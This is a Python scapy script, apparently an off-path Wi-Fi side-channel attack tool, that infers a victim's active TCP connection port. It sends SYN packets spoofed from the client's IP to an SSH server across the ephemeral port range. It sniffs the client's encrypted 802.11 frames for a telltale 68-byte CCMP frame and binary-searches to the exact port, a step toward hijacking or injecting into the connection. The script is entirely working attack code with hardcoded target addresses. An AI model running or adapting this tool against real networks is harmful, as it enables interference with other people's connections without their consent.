#!/usr/bin/python
from scapy.all import *
from copy import deepcopy
import time
from collections import deque

class Candidate:
    def __init__(self, port_list, time):
        self.port_list = port_list
        self.time = time

class Port_Finder:
    
    def __init__(self, client_ip='192.168.43.127', server_ip='124.70.155.59', server_port=22,
                 start_port=49152, end_port=65535, send_if_name='wlan0', sniff_if_name=['wlan1'],
                 client_mac='C0:B8:83:0E:AD:85', step_size=32, packet_repeat=4, repeat_time=1):
        self.client_mac = client_mac
        self.client_ip = client_ip
        self.server_ip = server_ip
        self.client_port = -1
        self.server_port = server_port

        self.start_port = start_port
        self.current_port = self.start_port
        self.end_port = end_port

        self.send_if_name = send_if_name 
        self.sniff_if_name = sniff_if_name
        self.step_size = step_size
        self.packet_repeat = packet_repeat
        self.repeat_time = repeat_time

        self.target_frame_num = 0
        self.stop = False
        self.port_range_end = False
        self.candidate_deque = deque()

        self.send_num = 0
        self.send_byte = 0
        self.cost_time = 0
        self.send_rate = 0
        self.result = -1

        self.frame_num = 0
        self.AMSDU_num = 0
        self.valid_frame_num = 0

    def handle_packets(self, packet_list):
        self.target_frame_num = 0

        for pkt in packet_list:
            if pkt[Dot11].addr1==self.client_mac:
                self.frame_num += 1
                if pkt[Dot11].type==2 and pkt[Dot11].subtype==8:
                    ##### This is a qos frame #####
                    if pkt.haslayer("Dot11CCMP"):

                        if pkt.haslayer("Dot11QoS"):
                            if pkt[Dot11QoS].A_MSDU_Present == 1:
                                self.AMSDU_num += 1

                        if len(pkt[Dot11CCMP].data)==68:
                            self.target_frame_num += 1
                            self.valid_frame_num += 1
                            break
    
    def check_port_list(self, port_list):
        if not port_list:
            self.target_frame_num = 0
            print('[*] Warning: the port list is empty')
            return

        send_list = []
        for p in port_list:
            for i in range(self.packet_repeat):
                send_list.append(IP(src=self.client_ip, dst=self.server_ip) / 
                                  TCP(sport=p, dport=self.server_port, flags='S'))

        self.send_num += len(send_list)
        for pkt in send_list:
            self.send_byte += len(pkt)
        
        pkts = sniff(filter="ether host "+self.client_mac, iface=self.sniff_if_name, count=0, 
                      timeout=0.15, started_callback=lambda: send(send_list, iface=self.send_if_name, verbose=False))

        if port_list[0] % 500 == 0:
            print('[+] Check port range %d ~ %d' %(port_list[0], port_list[-1]))
        self.handle_packets(pkts)

    def find_port(self):
        print("++++++++++ Try to find the connection port ++++++++++")
        ##### Binary search #####
        while not self.stop:
            if not self.candidate_deque and self.port_range_end:
                self.stop = True

            port_list = []
            if self.candidate_deque:
                candidate = self.candidate_deque[0]
                if time.time() - candidate.time > self.repeat_time:
                    port_list.extend(candidate.port_list)
                    self.candidate_deque.popleft()
                    print('[+] Check the candidate list again and the candidate queue length is %d' %(len(self.candidate_deque)))
            
            if not port_list:
                s_p = self.current_port
                e_p = min(self.current_port + self.step_size, self.end_port)
                self.current_port = e_p

                if self.current_port >= self.end_port:
                    self.port_range_end = True
                port_list.extend(list(range(s_p, e_p)))

            if not port_list:
                continue

            self.check_port_list(port_list=port_list)
            if self.target_frame_num > 0:
                print('[+] Find a suspicious port range')
                suspicious_port_list = copy.deepcopy(port_list)
                sus_list_len = len(suspicious_port_list)
                mid = int(sus_list_len / 2)

                list_start_len = len(port_list)
                list_end_len = list_start_len
                candidate_list = []

                suspicious_left = copy.deepcopy(suspicious_port_list[0:mid])
                suspicious_right = copy.deepcopy(suspicious_port_list[mid:sus_list_len])

                double_port = 0
                while sus_list_len > 1:
                    list_end_len = len(suspicious_port_list)
                    candidate_list = copy.deepcopy(suspicious_port_list)
                    suspicious_port_list = []

                    time.sleep(0.5)
                    self.check_port_list(suspicious_left)
                    if self.target_frame_num > 0:
                        suspicious_port_list.extend(copy.deepcopy(suspicious_left))
                    
                    time.sleep(0.5)
                    self.check_port_list(suspicious_right)
                    if self.target_frame_num > 0:
                        suspicious_port_list.extend(copy.deepcopy(suspicious_right))
                    
                    sus_list_len = len(suspicious_port_list)
                    mid = int(sus_list_len / 2)
                    suspicious_left = copy.deepcopy(suspicious_port_list[0:mid])
                    suspicious_right = copy.deepcopy(suspicious_port_list[mid:sus_list_len])

                    if sus_list_len == list_end_len:
                        double_port += 1
                        if double_port >= 5:
                            suspicious_left = []
                            double_port = 0
                            print('[#] This port range include two client port')
                
                if sus_list_len == 1:
                    self.result = suspicious_port_list[0]
                    print('[+] Find the client port: %d' %self.result)
                    self.stop = True
                else:
                    if list_end_len < list_start_len:
                        time_now = time.time()
                        self.candidate_deque.append(Candidate(candidate_list, time_now))
                        print('[+] Add a candidate, the candidate queue length is %d' %(len(self.candidate_deque)))
                    else:
                        print('[-] Not the real port range')
                        pass


    def run(self):
        time_start = time.time()

        self.current_port = self.start_port
        self.stop = False
        self.send_num = 0
        self.send_byte = 0
        self.cost_time = 0
        self.result = -1
        self.find_port()
        
        time_end = time.time()
        self.cost_time = time_end - time_start
        self.send_rate = self.send_byte / self.cost_time

        print('Find the client port: %d' %self.result)
        print('Send Packets: %d' %self.send_num)
        print('Send Bytes: %d (Bytes)' %self.send_byte)
        print('Cost Time: %f (s)' %(self.cost_time))
        print("Send Rate: %f (Byte/s)" %(self.send_rate))




